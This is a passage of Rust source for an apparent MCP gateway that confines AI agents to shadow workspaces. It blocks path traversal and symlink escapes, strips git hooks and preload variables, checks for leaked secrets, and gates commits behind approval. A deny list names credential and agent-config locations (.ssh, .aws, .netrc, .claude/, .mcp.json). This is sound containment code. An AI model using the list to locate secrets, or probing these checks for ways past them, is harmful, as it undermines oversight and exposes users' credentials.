//! Aegis OS MCP Gateway & Kernel Router (`aos-mcp-gateway`)
//!
//! Unifies all Aegis OS subsystems (`aos-policy`, `aos-vfs`, `aos-ipc`, `aos-sandbox`,
//! `aos-egress`, `aos-recorder`) behind a single MCP-compliant interface.
//! Supports both Stdio MCP transport and cross-process disk-synchronized state
//! for multi-agent AGY workflows.

#![recursion_limit = "512"]

use aos_core::{
    claims, A2AArtifact, A2ATaskState, AgentIdentity, AgentSkill, AuditEvent, DiffChangeType,
    ExecSpec, FlightRecorder, IpcBus, IpcEnvelope, IpcKind, IsolationTier, LeaseGrant, LeaseKind,
    MessageDeliveryStatus, OrgSharedStorage, PolicyContext, PolicyDecision, PolicyEngine,
    ResourceLimits, SandboxConfig, SandboxDriver, SandboxInstance, SnapshotMeta,
    TransactionalWorkspace,
};
use aos_egress::{detect_dlp_patterns, redact_dlp_secrets, AegisEgressGateway, SecretVaultEntry};
use aos_ipc::AegisIpcBus;
use aos_memory::MemoryAction;
use aos_policy::AegisPolicyKernel;
use aos_recorder::AegisFlightRecorder;
use aos_sandbox::{MicroVmSandboxDriver, NativeOsSandboxDriver};
use aos_vfs::vault::{OrgVaultManager, VaultStatus};
use aos_vfs::{CoWWorkspace, OrgCasAndKvStore};
use anyhow::{bail, Context};
use base64::Engine as _;
use chrono::Utc;
use hmac::{Hmac, Mac};
use sha2::{Digest, Sha256};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::sync::RwLock;
use uuid::Uuid;

pub mod app_store;
pub mod approver;
pub mod paas;
use app_store::AppStoreRegistry;
use paas::PaasControlPlane;

/// Splits an agent-supplied path into plain components relative to the shadow root. A leading `/`
/// is tolerated (agents often write repo-absolute paths); `..`, drive prefixes and empty paths are not.
fn shadow_relative(rel: &str) -> anyhow::Result<PathBuf> {
    use std::path::Component;
    let mut out = PathBuf::new();
    for comp in Path::new(rel.trim_start_matches('/')).components() {
        match comp {
            Component::Normal(c) => out.push(c),
            Component::CurDir => {}
            _ => bail!("Path traversal outside shadow workspace is forbidden: '{}'", rel),
        }
    }
    if out.as_os_str().is_empty() {
        bail!("Path must name a file inside the shadow workspace");
    }
    Ok(out)
}

/// Resolves a path for `fs_write` / `fs_edit` / `fs_delete`. The gateway runs unsandboxed, so a
/// symlink planted from `proc_exec` (or a host-linked `node_modules`) would redirect the write to
/// the host; any symlink on the path is therefore refused.
fn shadow_path_for_write(root: &Path, rel: &str) -> anyhow::Result<(String, PathBuf)> {
    let rel_path = shadow_relative(rel)?;
    let mut cur = root.to_path_buf();
    for comp in rel_path.components() {
        cur.push(comp);
        match std::fs::symlink_metadata(&cur) {
            Ok(meta) if meta.file_type().is_symlink() => bail!(
                "Refusing to write through symlink '{}' in the shadow workspace",
                cur.strip_prefix(root).unwrap_or(&cur).display()
            ),
            Ok(_) => {}
            Err(_) => break, // the rest does not exist yet and will be created as real entries
        }
    }
    let full = root.join(&rel_path);
    Ok((rel_path.to_string_lossy().into_owned(), full))
}

/// Resolves a path for `fs_read`. Symlinks may be followed (host-linked `node_modules`/`.venv` are
/// expected), but the real target must stay inside the shadow workspace or the host repo.
fn shadow_path_for_read(root: &Path, host_root: &Path, rel: &str) -> anyhow::Result<(String, PathBuf)> {
    let rel_path = shadow_relative(rel)?;
    let full = root.join(&rel_path);
    let real = std::fs::canonicalize(&full)
        .with_context(|| format!("File '{}' not found in CoW workspace", rel_path.display()))?;
    let allowed = [root, host_root]
        .iter()
        .filter_map(|r| std::fs::canonicalize(r).ok())
        .any(|r| real.starts_with(&r));
    if !allowed {
        bail!(
            "Refusing to read '{}': it resolves outside the shadow workspace and host repo",
            rel_path.display()
        );
    }
    Ok((rel_path.to_string_lossy().into_owned(), real))
}

const MAX_BINARY_EXPORT_BYTES: u64 = 128 * 1024 * 1024;
const MAX_INLINE_ARTIFACT_FETCH_BYTES: usize = 32 * 1024;

fn infer_mime_type(path: &Path) -> &'static str {
    match path
        .extension()
        .and_then(|s| s.to_str())
        .unwrap_or("")
        .to_ascii_lowercase()
        .as_str()
    {
        "pdf" => "application/pdf",
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "gif" => "image/gif",
        "webp" => "image/webp",
        "tiff" | "tif" => "image/tiff",
        "svg" => "image/svg+xml",
        "zip" => "application/zip",
        "tar" => "application/x-tar",
        "gz" | "tgz" => "application/gzip",
        "parquet" => "application/vnd.apache.parquet",
        "sqlite" | "db" => "application/vnd.sqlite3",
        "docx" => "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        "pptx" => "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        "xlsx" => "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        "wasm" => "application/wasm",
        "json" => "application/json",
        "jsonl" => "application/x-ndjson",
        "csv" => "text/csv",
        "tsv" => "text/tab-separated-values",
        "md" | "markdown" => "text/markdown",
        "tex" | "bib" => "application/x-tex",
        "yaml" | "yml" => "application/yaml",
        "txt" | "log" => "text/plain",
        _ => "application/octet-stream",
    }
}

fn strip_root_matching_macos_private<'a>(path: &'a Path, root: &Path) -> Option<PathBuf> {
    if let Ok(rel) = path.strip_prefix(root) {
        return Some(rel.to_path_buf());
    }
    if let Ok(canon_root) = std::fs::canonicalize(root) {
        if let Ok(rel) = path.strip_prefix(&canon_root) {
            return Some(rel.to_path_buf());
        }
        #[cfg(target_os = "macos")]
        {
            let raw_s = path.to_string_lossy();
            if raw_s.starts_with("/var/") || raw_s.starts_with("/tmp/") {
                let priv_path = PathBuf::from(format!("/private{raw_s}"));
                if let Ok(rel) = priv_path.strip_prefix(&canon_root) {
                    return Some(rel.to_path_buf());
                }
            }
            let canon_s = canon_root.to_string_lossy();
            if let Some(stripped) = canon_s.strip_prefix("/private") {
                if let Ok(rel) = path.strip_prefix(Path::new(stripped)) {
                    return Some(rel.to_path_buf());
                }
            }
        }
    }
    None
}

fn open_and_read_no_symlink(root: &Path, rel: &Path) -> anyhow::Result<(PathBuf, Vec<u8>)> {
    use std::io::Read;
    let canon_root = std::fs::canonicalize(root)
        .with_context(|| format!("Sandbox root '{}' is unavailable", root.display()))?;
    let mut cur = canon_root.clone();
    for comp in rel.components() {
        let std::path::Component::Normal(seg) = comp else {
            bail!("Invalid relative path component in '{}'", rel.display());
        };
        cur.push(seg);
        let meta = std::fs::symlink_metadata(&cur)
            .with_context(|| format!("Source file '{}' not found", cur.display()))?;
        if meta.file_type().is_symlink() {
            bail!(
                "Refusing to read through symlink '{}' in sandbox",
                cur.display()
            );
        }
    }
    let meta = std::fs::symlink_metadata(&cur)
        .with_context(|| format!("Source file '{}' not found", cur.display()))?;
    if !meta.file_type().is_file() {
        bail!("Source path '{}' is not a regular file", cur.display());
    }
    if meta.len() > MAX_BINARY_EXPORT_BYTES {
        bail!(
            "Source file '{}' ({} bytes) exceeds maximum binary export limit ({} bytes)",
            cur.display(),
            meta.len(),
            MAX_BINARY_EXPORT_BYTES
        );
    }
    let canon_file = std::fs::canonicalize(&cur)?;
    if !canon_file.starts_with(&canon_root) {
        bail!(
            "Refusing to read '{}': resolves outside allowed sandbox root",
            cur.display()
        );
    }

    let mut opts = std::fs::OpenOptions::new();
    opts.read(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.custom_flags(libc::O_NOFOLLOW);
    }
    let file = opts
        .open(&cur)
        .with_context(|| format!("Opening source file '{}'", cur.display()))?;
    let mut buf = Vec::with_capacity(meta.len() as usize);
    file.take(MAX_BINARY_EXPORT_BYTES + 1).read_to_end(&mut buf)?;
    if (buf.len() as u64) > MAX_BINARY_EXPORT_BYTES {
        bail!("Source file '{}' exceeded export size limit while reading", cur.display());
    }
    Ok((canon_file, buf))
}

/// Reads raw bytes from a file strictly inside `shadow_root`, `agent_home_dir` (including `$TMPDIR`),
/// or `org_pub_dir`, rejecting any symlink traversal via component checks + `O_NOFOLLOW`.
fn read_sandbox_file_bytes_no_symlink(
    shadow_root: &Path,
    agent_home_dir: &Path,
    org_pub_dir: &Path,
    raw_src: &str,
) -> anyhow::Result<(PathBuf, Vec<u8>)> {
    let trimmed = raw_src.trim();
    if trimmed.is_empty() {
        bail!("Missing non-empty 'src_path'");
    }
    if let Some(rest) = trimmed
        .strip_prefix("$TMPDIR/")
        .or_else(|| trimmed.strip_prefix("${TMPDIR}/"))
    {
        let rel = shadow_relative(rest)?;
        let direct = open_and_read_no_symlink(agent_home_dir, &rel);
        if direct.is_ok() {
            return direct;
        }
        return open_and_read_no_symlink(&agent_home_dir.join("tmp"), &rel);
    }

    let p = Path::new(trimmed);
    if p.components()
        .any(|c| matches!(c, std::path::Component::ParentDir | std::path::Component::Prefix(_)))
    {
        bail!("Path traversal ('..') is forbidden in source path '{}'", trimmed);
    }

    if p.is_absolute() {
        for root in [shadow_root, agent_home_dir, org_pub_dir] {
            if let Some(rel) = strip_root_matching_macos_private(p, root) {
                if !rel.as_os_str().is_empty() {
                    return open_and_read_no_symlink(root, &rel);
                }
            }
        }
        bail!(
            "Source path '{}' must reside inside your CoW shadow workspace, agent home ($TMPDIR), or organization publish directory",
            trimmed
        );
    }

    let rel = shadow_relative(trimmed)?;
    open_and_read_no_symlink(shadow_root, &rel)
}

fn canonicalize_export_dest_no_trailing_symlink(
    dst_raw: &str,
    overwrite: bool,
) -> anyhow::Result<PathBuf> {
    let dst_trimmed = dst_raw.trim();
    let dst = Path::new(dst_trimmed);
    if !dst.is_absolute() {
        bail!("'dst_host_path' must be an absolute path: '{}'", dst_trimmed);
    }
    if dst.components().any(|c| matches!(c, std::path::Component::ParentDir)) {
        bail!("Path traversal ('..') is forbidden in 'dst_host_path': '{}'", dst_trimmed);
    }
    let file_name = dst
        .file_name()
        .and_then(|n| n.to_str())
        .filter(|n| !n.is_empty() && *n != "." && *n != "..")
        .with_context(|| format!("Invalid destination filename in '{}'", dst_trimmed))?;

    if let Ok(meta) = std::fs::symlink_metadata(dst) {
        if meta.file_type().is_symlink() {
            bail!("Refusing to export onto symlink '{}'", dst.display());
        }
        if meta.file_type().is_dir() {
            bail!("Destination '{}' is a directory, not a file", dst.display());
        }
        if !overwrite {
            bail!("Destination '{}' already exists and overwrite=false", dst.display());
        }
    }

    let parent = dst
        .parent()
        .with_context(|| format!("Destination '{}' has no parent directory", dst.display()))?;
    let mut existing = parent.to_path_buf();
    let mut tail = Vec::new();
    while !existing.exists() {
        match existing.file_name() {
            Some(seg) => {
                tail.push(seg.to_os_string());
                existing.pop();
            }
            None => break,
        }
    }
    if let Ok(parent_meta) = std::fs::symlink_metadata(&existing) {
        if !parent_meta.is_dir() {
            bail!("Parent '{}' is not a directory", existing.display());
        }
    }
    let mut resolved_parent = std::fs::canonicalize(&existing)
        .with_context(|| format!("Resolving destination ancestor '{}'", existing.display()))?;
    for seg in tail.into_iter().rev() {
        resolved_parent.push(seg);
    }
    Ok(resolved_parent.join(file_name))
}

fn strip_nested_test_tmpdir(s: &str) -> &str {
    if std::env::var("AEGIS_ALLOW_NESTED_TEST_SANDBOX").as_deref() != Ok("1") {
        return s;
    }
    let Some(idx) = s.find("/agent_home/.tmp") else {
        return s;
    };
    let rest = &s[idx + "/agent_home/".len()..];
    match rest.find('/') {
        Some(slash) => &rest[slash..],
        None => "",
    }
}

fn is_forbidden_export_dest(raw: &str, canonical: &str) -> bool {
    const RING0_MARKERS: &[&str] = &[
        "/.ssh",
        "/.aws",
        "/.gnupg",
        "/.kube",
        "/.docker",
        "/.azure",
        "/.config/gcloud",
        "/.config/aegis-os",
        "/Library/Keychains",
        "/.git-credentials",
        "/.netrc",
        "/.npmrc",
        "/.pypirc",
        "/.vault-token",
        "/.cargo/credentials",
        "/.gemini/",
        "/.claude/",
        "/.claude.json",
        "/.mcp.json",
        "/.codex/",
        "/opencode.json",
        "/opencode.jsonc",
        "/.config/opencode/",
        "/.cursor/",
        "/.vscode/",
        "/.hermes/",
        "/.agents/",
        "/.agent/",
        "/.aegis/",
        "/.aegis-bin",
        "/aegis-os-runtime/",
        "/.git/",
        "/.bashrc",
        "/.zshrc",
        "/.profile",
        "/.zprofile",
    ];
    const SYSTEM_PREFIXES: &[&str] = &[
        "/etc/",
        "/private/etc/",
        "/System/",
        "/usr/",
        "/bin/",
        "/sbin/",
        "/Library/LaunchAgents/",
        "/Library/LaunchDaemons/",
    ];
    for candidate in [raw, canonical] {
        let candidate = strip_nested_test_tmpdir(candidate);
        if RING0_MARKERS.iter().any(|m| candidate.contains(m))
            || SYSTEM_PREFIXES.iter().any(|p| candidate.starts_with(p))
            || AegisPolicyKernel::is_commit_poisoning_path(candidate)
        {
            return true;
        }
    }
    false
}

fn validate_export_payload_and_dest(
    dst_raw: &str,
    bytes: &[u8],
    overwrite: bool,
) -> anyhow::Result<(PathBuf, &'static str)> {
    let canon_dst = canonicalize_export_dest_no_trailing_symlink(dst_raw, overwrite)?;
    let canon_str = canon_dst.to_string_lossy();
    if is_forbidden_export_dest(dst_raw, &canon_str) {
        bail!(
            "Blocked by Aegis OS Ring-0 policy: exporting to protected, credential, or build/hook-sensitive path '{}' is forbidden",
            canon_dst.display()
        );
    }

    let is_exec_or_script = bytes.starts_with(b"\x7fELF")
        || bytes.starts_with(&[0xcf, 0xfa, 0xed, 0xfe])
        || bytes.starts_with(&[0xfe, 0xed, 0xfa, 0xcf])
        || bytes.starts_with(&[0xca, 0xfe, 0xba, 0xbe])
        || bytes.starts_with(b"MZ")
        || bytes.starts_with(b"#!");
    if is_exec_or_script {
        bail!("Refusing to export executable binary or script via fs_export_file");
    }

    let ext = canon_dst
        .extension()
        .and_then(|s| s.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();
    let magic_ok = match ext.as_str() {
        "pdf" => bytes.starts_with(b"%PDF-"),
        "png" => bytes.starts_with(b"\x89PNG\r\n\x1a\n"),
        "jpg" | "jpeg" => bytes.starts_with(&[0xff, 0xd8, 0xff]),
        "sqlite" | "db" => bytes.starts_with(b"SQLite format 3\0"),
        _ => true,
    };
    if !magic_ok {
        bail!(
            "Payload magic-byte header mismatch for extension '.{}' when exporting to '{}'",
            ext,
            canon_dst.display()
        );
    }

    let mime = infer_mime_type(&canon_dst);
    Ok((canon_dst, mime))
}

async fn export_file_atomic_from_cas_or_bytes(
    cas_blob: Option<PathBuf>,
    bytes: Vec<u8>,
    dst: PathBuf,
) -> anyhow::Result<()> {
    tokio::task::spawn_blocking(move || {
        use std::io::Write;
        let parent = dst
            .parent()
            .with_context(|| format!("Destination '{}' has no parent", dst.display()))?;
        std::fs::create_dir_all(parent)?;
        if let Ok(meta) = std::fs::symlink_metadata(&dst) {
            if meta.file_type().is_symlink() || meta.file_type().is_dir() {
                bail!("Refusing to export onto symlink or directory '{}'", dst.display());
            }
        }
        #[cfg(unix)]
        let mode = {
            use std::os::unix::fs::PermissionsExt;
            std::fs::metadata(&dst)
                .ok()
                .map(|m| m.permissions().mode() & 0o7777)
                .unwrap_or(0o644)
        };

        let file_name = dst
            .file_name()
            .and_then(|n| n.to_str())
            .filter(|n| !n.is_empty())
            .unwrap_or("export");
        let tmp = parent.join(format!(
            ".{}.aegis-export-{}-{}",
            file_name,
            std::process::id(),
            Uuid::new_v4().simple()
        ));

        let stage_res = (|| -> anyhow::Result<()> {
            if let Some(ref blob) = cas_blob {
                if blob.is_file() {
                    CoWWorkspace::cow_clone_file_blocking(blob, &tmp)?;
                    if let Ok(f) = std::fs::OpenOptions::new().write(true).open(&tmp) {
                        #[cfg(unix)]
                        {
                            use std::os::unix::fs::PermissionsExt;
                            let _ = f.set_permissions(std::fs::Permissions::from_mode(mode));
                        }
                        let _ = f.set_modified(std::time::SystemTime::now());
                        let _ = f.sync_all();
                    }
                    return Ok(());
                }
            }
            let mut f = std::fs::OpenOptions::new()
                .create_new(true)
                .write(true)
                .open(&tmp)?;
            f.write_all(&bytes)?;
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                f.set_permissions(std::fs::Permissions::from_mode(mode))?;
            }
            let _ = f.set_modified(std::time::SystemTime::now());
            f.sync_all()?;
            Ok(())
        })();
        if let Err(err) = stage_res {
            let _ = std::fs::remove_file(&tmp);
            return Err(err);
        }
        if let Err(err) = std::fs::rename(&tmp, &dst) {
            let _ = std::fs::remove_file(&tmp);
            return Err(err.into());
        }
        Ok(())
    })
    .await?
}

struct ImportFilePlan {
    canon_src: PathBuf,
    src_sha256: String,
    import_to: String,
    clean_dst_rel: String,
    dst_full_path: PathBuf,
    evidence_hash: String,
}

fn expand_home_tilde(raw: &str) -> PathBuf {
    if raw == "~" {
        if let Some(h) = std::env::var_os("HOME") {
            return PathBuf::from(h);
        }
    } else if let Some(rest) = raw.strip_prefix("~/") {
        if let Some(h) = std::env::var_os("HOME") {
            return PathBuf::from(h).join(rest);
        }
    }
    PathBuf::from(raw)
}

struct HostGitPlan {
    git_bin: PathBuf,
    host_root: PathBuf,
    paths: Vec<String>,
    shadow_paths: Vec<String>,
    auto_commit_shadow: bool,
    verify_cmd: Option<String>,
    verify_timeout_ms: Option<u64>,
    overwrite_binaries: bool,
    skip_verify: bool,
    shadow_evidence_hash: Option<String>,
    checkout_branch: Option<String>,
    create_branch: bool,
    sync_mode: Option<String>,
    commit_message: Option<String>,
    trailers: Vec<String>,
    tag: Option<String>,
    force_tag: bool,
    push: bool,
    force_push: bool,
    remote: String,
    remote_url: Option<String>,
    push_branch: Option<String>,
    evidence_hash: String,
}

struct GitHubCiRerunPlan {
    repo: String,
    run_id: u64,
    failed_only: bool,
    job_id: Option<u64>,
    evidence_hash: String,
}

struct GitHubPrCreatePlan {
    repo: String,
    title: String,
    body: String,
    base: Option<String>,
    head: Option<String>,
    draft: bool,
    evidence_hash: String,
}

struct GitHubCommentCreatePlan {
    repo: String,
    number: u64,
    body: String,
    evidence_hash: String,
}

struct GitHubPrMergePlan {
    repo: String,
    pr_number: u64,
    method: String,
    delete_branch: bool,
    subject: Option<String>,
    body: Option<String>,
    evidence_hash: String,
}

fn ensure_no_dlp_secrets(fields: &[&str], context_label: &str) -> anyhow::Result<()> {
    let mut combined = Vec::new();
    for field in fields {
        for hit in detect_dlp_patterns(field) {
            if !combined.contains(&hit) {
                combined.push(hit);
            }
        }
    }
    if !combined.is_empty() {
        bail!(
            "Blocked by Aegis OS DLP policy: {} contains sensitive secret pattern(s): {:?}",
            context_label,
            combined
        );
    }
    Ok(())
}

fn resolve_workspace_verify_config(
    host_root: &Path,
    args: &Value,
    skip_verify: bool,
) -> (Option<String>, Option<String>, Option<u64>) {
    let host_verify_cfg: Option<Value> = std::fs::read(host_root.join(".aegis/verify.json"))
        .ok()
        .and_then(|bytes| serde_json::from_slice(&bytes).ok());
    let configured_verify_cmd = std::env::var("AOS_VERIFY_CMD")
        .ok()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .or_else(|| {
            host_verify_cfg
                .as_ref()
                .and_then(|cfg| cfg.get("verify_cmd"))
                .and_then(|v| v.as_str())
                .map(|s| s.trim().to_string())
                .filter(|s| !s.is_empty())
        });
    let verify_cmd = if skip_verify {
        None
    } else {
        args.get("verify_cmd")
            .and_then(|v| v.as_str())
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .or_else(|| configured_verify_cmd.clone())
    };
    let timeout_ms = args
        .get("verify_timeout_ms")
        .and_then(|v| v.as_u64())
        .or_else(|| {
            host_verify_cfg
                .as_ref()
                .and_then(|cfg| cfg.get("timeout_ms"))
                .and_then(|v| v.as_u64())
        })
        .or(Some(30_000));
    (configured_verify_cmd, verify_cmd, timeout_ms)
}

fn validate_repo_relative_paths(raw_paths: Vec<String>, context_name: &str) -> anyhow::Result<Vec<String>> {
    let mut paths = Vec::new();
    for p in raw_paths {
        let norm = p.trim().trim_start_matches("./").to_string();
        if norm.is_empty() {
            continue;
        }
        if norm.starts_with('/')
            || norm.starts_with('-')
            || norm.contains('\\')
            || norm.contains('\0')
            || Path::new(&norm).components().any(|c| {
                matches!(
                    c,
                    std::path::Component::ParentDir
                        | std::path::Component::RootDir
                        | std::path::Component::Prefix(_)
                ) || c.as_os_str() == ".git"
            })
        {
            bail!("Invalid repo-relative path '{}' in {}", norm, context_name);
        }
        if !paths.contains(&norm) {
            paths.push(norm);
        }
    }
    Ok(paths)
}

fn resolve_system_git_binary() -> anyhow::Result<PathBuf> {
    ["/usr/bin/git", "/opt/homebrew/bin/git", "/usr/local/bin/git", "/bin/git"]
        .into_iter()
        .map(PathBuf::from)
        .find(|p| p.is_file())
        .context("System `git` binary not found in /usr/bin, /opt/homebrew/bin, /usr/local/bin, or /bin")
}

fn run_sanitized_host_git(
    git_bin: &Path,
    repo_root: &Path,
    extra_cfg: &[(&str, &str)],
    git_args: &[String],
) -> anyhow::Result<std::process::Output> {
    let mut cmd = std::process::Command::new(git_bin);
    for var in [
        "GIT_DIR",
        "GIT_WORK_TREE",
        "GIT_INDEX_FILE",
        "GIT_OBJECT_DIRECTORY",
        "GIT_ALTERNATE_OBJECT_DIRECTORIES",
        "GIT_CEILING_DIRECTORIES",
        "GIT_EXTERNAL_DIFF",
        "GIT_EXEC_PATH",
        "GIT_TEMPLATE_DIR",
        "GIT_CONFIG_PARAMETERS",
        "GIT_CONFIG_COUNT",
        "GIT_CONFIG_GLOBAL",
        "GIT_CONFIG_NOSYSTEM",
        "LD_PRELOAD",
        "DYLD_INSERT_LIBRARIES",
    ] {
        cmd.env_remove(var);
    }
    cmd.env("GIT_TERMINAL_PROMPT", "0");
    cmd.env("GCM_INTERACTIVE", "never");
    cmd.arg("-C").arg(repo_root);
    cmd.args(["-c", "core.hooksPath=/dev/null", "-c", "core.fsmonitor=false"]);
    for (k, v) in extra_cfg {
        cmd.arg("-c").arg(format!("{k}={v}"));
    }
    cmd.args(git_args);
    cmd.output()
        .with_context(|| format!("executing {} in {}", git_bin.display(), repo_root.display()))
}

fn is_safe_remote_name(remote: &str) -> bool {
    !remote.is_empty()
        && remote.len() <= 64
        && !remote.starts_with('-')
        && remote
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
}

fn is_safe_git_ref_name(git_bin: &Path, repo_root: &Path, ref_name: &str) -> bool {
    if ref_name.is_empty()
        || ref_name.len() > 128
        || ref_name.starts_with('-')
        || ref_name.starts_with('+')
        || ref_name.contains(':')
        || ref_name.contains('\\')
        || ref_name.contains("..")
        || ref_name.contains("@{")
        || ref_name.chars().any(|c| c.is_whitespace() || c.is_control())
    {
        return false;
    }
    run_sanitized_host_git(
        git_bin,
        repo_root,
        &[],
        &[
            "check-ref-format".to_string(),
            "--allow-onelevel".to_string(),
            ref_name.to_string(),
        ],
    )
    .map(|o| o.status.success())
    .unwrap_or(false)
}

async fn execute_workspace_git_plan(
    gateway: &AegisRuntimeKernel,
    env: &AgentEnvironment,
    mut plan: HostGitPlan,
    identity: &AgentIdentity,
) -> anyhow::Result<Value> {
    let mut shadow_committed = Vec::new();
    let mut verified_shadow = false;

    if plan.auto_commit_shadow && !plan.shadow_paths.is_empty() {
        let _ = env.workspace.refresh_from_host().await?;
        let pre_verify_epoch = env.workspace.read_host_commit_epoch();
        if !plan.skip_verify {
            if let Some(ref cmd) = plan.verify_cmd {
                let verify_out = env
                    .sandbox
                    .exec(ExecSpec {
                        command: "sh".to_string(),
                        args: vec!["-c".to_string(), cmd.clone()],
                        cwd: Some(env.workspace.shadow_root().to_path_buf()),
                        env: HashMap::new(),
                        timeout_ms: plan.verify_timeout_ms.or(Some(30_000)),
                        background: false,
                    })
                    .await?;
                if verify_out.exit_code != Some(0) {
                    let diag = if !verify_out.stderr.trim().is_empty() {
                        verify_out.stderr.trim()
                    } else {
                        verify_out.stdout.trim()
                    };
                    bail!(
                        "Pre-commit verification gate '{}' failed in shadow workspace (exit code {:?}; host & git untouched): {}",
                        cmd,
                        verify_out.exit_code,
                        diag
                    );
                }
                verified_shadow = true;
            }
        }
        let _host_commit_lock = env.workspace.acquire_host_commit_lock().await?;
        if env.workspace.read_host_commit_epoch() != pre_verify_epoch {
            let retry_refresh = env.workspace.refresh_from_host().await?;
            if !retry_refresh.conflicts.is_empty() {
                bail!(
                    "3-Way Merge Conflict detected against concurrent peer commit on {:?}: {:?}",
                    retry_refresh.conflicts,
                    retry_refresh.conflict_details
                );
            }
        }
        let base_dir = env
            .workspace
            .shadow_root()
            .parent()
            .map(|p| p.join("baseline_snapshot"))
            .filter(|p| p.exists())
            .unwrap_or_else(|| env.workspace.host_source_root().to_path_buf());
        let current_diffs = CoWWorkspace::diff_dirs(
            &base_dir,
            env.workspace.shadow_root(),
            Some(&plan.shadow_paths),
        )
        .await?;
        let (_, recomputed_shadow_hash) = aos_core::compute_diff_evidence(
            &current_diffs,
            plan.overwrite_binaries,
            plan.skip_verify,
        );
        if plan.shadow_evidence_hash.as_deref() != Some(recomputed_shadow_hash.as_str()) {
            bail!(
                "TOCTOU integrity error: CoW shadow changes drifted after approval; re-request workspace_git approval before landing"
            );
        }
        if let Some(msg) = gateway
            .claim_conflict_for_paths(identity, &plan.shadow_paths)
            .await?
        {
            bail!("{}", msg);
        }
        shadow_committed = env
            .workspace
            .commit_to_host_with_options(Some(plan.shadow_paths.clone()), plan.overwrite_binaries)
            .await?;
        let _ = env.workspace.bump_host_commit_epoch().await;
        if !shadow_committed.is_empty() {
            let _ = gateway
                .release_claims_matching_committed_paths(identity, &shadow_committed)
                .await;
            if !plan
                .trailers
                .iter()
                .any(|t| t.starts_with("Aegis-OS-Verified:"))
            {
                let short_ev = &recomputed_shadow_hash[..recomputed_shadow_hash.len().min(12)];
                plan.trailers.push(format!(
                    "Aegis-OS-Verified: principal={}/{} files={} evidence=sha256:{} verify={}",
                    identity.org_id,
                    identity.agent_id,
                    shadow_committed.len(),
                    short_ev,
                    if verified_shadow { "passed" } else { "cow-3way" }
                ));
            }
        }
    }

    let need_shadow_refresh = plan.sync_mode.is_some() || plan.checkout_branch.is_some();
    let identity_org = identity.org_id.clone();
    let identity_agent = identity.agent_id.clone();
    let git_result = tokio::task::spawn_blocking(move || {
        let mut checked_out_branch = None;
        if let Some(ref branch_name) = plan.checkout_branch {
            let co_args = if plan.create_branch {
                vec!["checkout".to_string(), "-b".to_string(), branch_name.clone()]
            } else {
                vec!["checkout".to_string(), branch_name.clone()]
            };
            let co_out = run_sanitized_host_git(&plan.git_bin, &plan.host_root, &[], &co_args)?;
            if !co_out.status.success() {
                bail!(
                    "git checkout '{}' failed: {}",
                    branch_name,
                    String::from_utf8_lossy(&co_out.stderr).trim()
                );
            }
            checked_out_branch = Some(branch_name.clone());
        }

        let mut synced_mode = None;
        if let Some(ref mode) = plan.sync_mode {
            let mut sync_args = match mode.as_str() {
                "fetch" => vec![
                    "fetch".to_string(),
                    "--prune".to_string(),
                    "--".to_string(),
                    plan.remote.clone(),
                ],
                "pull_ff_only" => vec![
                    "pull".to_string(),
                    "--ff-only".to_string(),
                    "--".to_string(),
                    plan.remote.clone(),
                ],
                "pull_rebase" => vec![
                    "pull".to_string(),
                    "--rebase".to_string(),
                    "--".to_string(),
                    plan.remote.clone(),
                ],
                other => bail!("Unsupported sync mode '{}'", other),
            };
            if mode != "fetch" {
                if let Some(ref b) = plan.push_branch {
                    sync_args.push(b.clone());
                }
            }
            let sync_out = run_sanitized_host_git(&plan.git_bin, &plan.host_root, &[], &sync_args)?;
            if !sync_out.status.success() {
                bail!(
                    "git {} failed: {}",
                    mode,
                    String::from_utf8_lossy(&sync_out.stderr).trim()
                );
            }
            synced_mode = Some(mode.clone());
        }

        let mut author_cfg: Vec<(String, String)> = Vec::new();
        if plan.commit_message.is_some() {
            let has_name = run_sanitized_host_git(
                &plan.git_bin,
                &plan.host_root,
                &[],
                &["config".to_string(), "user.name".to_string()],
            )
            .map(|o| o.status.success() && !String::from_utf8_lossy(&o.stdout).trim().is_empty())
            .unwrap_or(false);
            let has_email = run_sanitized_host_git(
                &plan.git_bin,
                &plan.host_root,
                &[],
                &["config".to_string(), "user.email".to_string()],
            )
            .map(|o| o.status.success() && !String::from_utf8_lossy(&o.stdout).trim().is_empty())
            .unwrap_or(false);
            if !has_name {
                author_cfg.push((
                    "user.name".to_string(),
                    format!("Aegis OS ({identity_org}/{identity_agent})"),
                ));
            }
            if !has_email {
                author_cfg.push(("user.email".to_string(), "noreply@aegis-os.local".to_string()));
            }
        }
        let author_cfg_refs: Vec<(&str, &str)> = author_cfg
            .iter()
            .map(|(k, v)| (k.as_str(), v.as_str()))
            .collect();

        if let Some(ref msg) = plan.commit_message {
            let mut add_args = vec!["add".to_string(), "--".to_string()];
            add_args.extend(plan.paths.iter().cloned());
            let add_out = run_sanitized_host_git(&plan.git_bin, &plan.host_root, &[], &add_args)?;
            if !add_out.status.success() {
                bail!(
                    "git add failed: {}",
                    String::from_utf8_lossy(&add_out.stderr).trim()
                );
            }

            let mut commit_args = vec!["commit".to_string(), "-m".to_string(), msg.clone()];
            for trailer in &plan.trailers {
                commit_args.push("-m".to_string());
                commit_args.push(trailer.clone());
            }
            commit_args.push("--".to_string());
            commit_args.extend(plan.paths.iter().cloned());
            let commit_out = run_sanitized_host_git(
                &plan.git_bin,
                &plan.host_root,
                &author_cfg_refs,
                &commit_args,
            )?;
            if !commit_out.status.success() {
                let err = String::from_utf8_lossy(&commit_out.stderr).trim().to_string();
                let out = String::from_utf8_lossy(&commit_out.stdout).trim().to_string();
                bail!("git commit failed: {}", if err.is_empty() { out } else { err });
            }
        }

        let head_out = run_sanitized_host_git(
            &plan.git_bin,
            &plan.host_root,
            &[],
            &["rev-parse".to_string(), "--verify".to_string(), "HEAD".to_string()],
        )?;
